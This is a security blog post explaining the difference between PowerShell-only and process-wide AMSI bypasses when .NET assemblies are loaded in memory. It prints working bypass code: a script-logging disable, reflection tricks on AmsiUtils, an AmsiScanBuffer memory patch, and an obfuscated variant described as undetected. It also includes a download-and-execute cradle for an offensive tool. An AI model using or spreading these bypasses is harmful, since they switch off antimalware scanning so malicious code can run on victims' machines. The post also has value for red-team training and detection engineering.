---
title: "The difference between Powershell only & process specific AMSI bypasses"
layout: "post"
---

In the last months I was often asked about potential errors using <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">PowerSharpPack</a> or other PS1-scripts loading .NET assemblies via `[System.Reflection.Assembly]::Load()`. The reason for theese messages is actually not an error or a bug, but the .NET AMSI Interface, which catches the binaries loaded via `[System.Reflection.Assembly]::Load()`. Some of the public Powershell AMSI bypasses just don`t work for loaded .NET binaries and the error message is not self explanatory. Therefore I'm gonna show some examples and bypass methods in this post.

<!--more-->

## Introduction

In the regular case if you are loading a Powershell script which is flagged as malicious by AMSI you will expect to see the following error message:

```batch
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-WireTap.ps1')
```

<p align="center">
          <img src="/assets/posts/AMSI_.NET/AMSIBlock.JPG">
</p>

The message `This script contains malicious content and has been blocked by your antivirus software.` is very clear and shows us, that this script is flagged by AMSI. So, if we build our own <a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">custom AMSI bypass</a> or just grab one payload from <a href="https://amsi.fail/">amsi.fail</a> and load the script afterwards, this will not result in any error message:

<p align="center">
          <img src="/assets/posts/AMSI_.NET/NoBlock.JPG">
</p>

This let´s us assume, that we successfully bypassed AMSI and are able to execute the script. However, if we try to execute it we will get a new error message, which seams to be not related to AMSI:

<p align="center">
          <img src="/assets/posts/AMSI_.NET/AMSI.NET.JPG">
</p>

`Exception calling "Load" with "1" argument(s): "Could not load file or assembly '288768 bytes loaded from Anonymously
Hosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. An
attempt was made to load a program with an incorrect format."` - this message is not telling about any malicious software found but states that the binaries format is incorrect. 

If you ever saw this message and wondered about it - welcome to the .NET AMSI Interface! :-) 

In this case, we successfully bypassed AMSI for the Powershell script-code itself, but `[System.Reflection.Assembly]::Load($byteOutArray)` triggers an AMSI-scan for the .NET binary which was base64 decoded and decompressed at runtime. But our bypass did not bypass the .NET AMSI-scan. Therefore the loading was blocked and `[WireT4p.Program]::main()` was not found. So let´s take a look at how we can still execute the script.

## The difference between Powershell only & process specific AMSI bypasses

First things first: Why is our bypass not working for the .NET assembly loading? If we take a closer look at some of the public <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">AMSI bypass techniques</a> we will see one thing they all have in common:

```batch
# Disable Script Logging:
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")

# Matt Graebers Reflection method:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Forcing an error:
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

They either disable Powershell Script-Logging or change subvalues of the `System.Management.Automation` namespace. The `System.Management.Automation` namespace basically is the root namespace for the Windows PowerShell. Both techniques are therefore Powershell specific and only affect the Anti Malware Scan-Interface for Powershell script-code.

The changed subvalues for `System.Management.Automation.AmsiUtils` in our PoC above therefore didn't break the .NET AMSI-scan - because it´s not related to Powershell. If you have read my other blog posts or the linked resources for the functionality of AMSI you already know, that `amsi.dll` is loaded into a new process to hook any input in the Powershell commandline or to analyze content for `[System.Reflection.Assembly]::Load()` calls. Other AMSI bypass techniques rely on <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass"> in memory patching</a> for `amsi.dll`, which breaks AMSI for the whole process. `[System.Reflection.Assembly]::Load()` doesn't create a new process - therefore using one of theese techniques will result in a bypass for the script code `AND` the .NET binary which is loaded.

As always we need to modify the public script code to circumvent AMSI for the bypass itself. For example <a href="https://twitter.com/_RastaMouse">@_RastaMouse's</a> AmsiScanBuffer bypass looks like this:

```batch
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

To make it short: The things, that are easily flaggable are the variable names, the .NET Class-Name in combination with the three loaded Windows API calls, the strings `amsi.dll` and `AmsiScanBuffer` and the Patch-bytes themself. In my opinion flagging the DLLImports would result in too many false positives, so that won't happen most likely.

I just created a <a href="https://github.com/Flangvik/AMSI.fail/pull/1">Pull Request for amsi.fail</a>, which automates the process of variable randomization and string obfuscation for the public code snippet. One of the resulting payloads looks like this and is not flagged at the time of writing:

```batch
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

Using this newly generated bypass and loading <a href="https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-WireTap.ps1">Invoke-Wiretap</a> afterwards results in no AMSI block for the script-code `AND` the .NET binary:

<p align="center">
          <img src="/assets/posts/AMSI_.NET/WireTapSuccess.JPG">
</p>

## Conclusion

We learned, that some of the public AMSI bypass techniques only work for Powershell script-code and therefore don't disable AMSI for .NET `assembly::load` calls.

To still bypass AMSI for Powershell scripts, which load .NET binaries we have to rely on for example in memory patching of `amsi.dll`. This will give us a "global" bypass for the current process.

## Links & Resources

* PowerSharpPack - <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">https://github.com/S3cur3Th1sSh1t/PowerSharpPack</a>
* Bypass AMSI by manual modification - <a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/</a>
* amsi.fail - <a href="https://amsi.fail/">https://amsi.fail/</a>
* Amsi Bypass Powershell - <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a>
* AmsiScanBufferBypass - <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass">https://github.com/rasta-mouse/AmsiScanBufferBypass</a>
* WireTap - <a href="https://github.com/djhohnstein/WireTap">https://github.com/djhohnstein/WireTap</a>
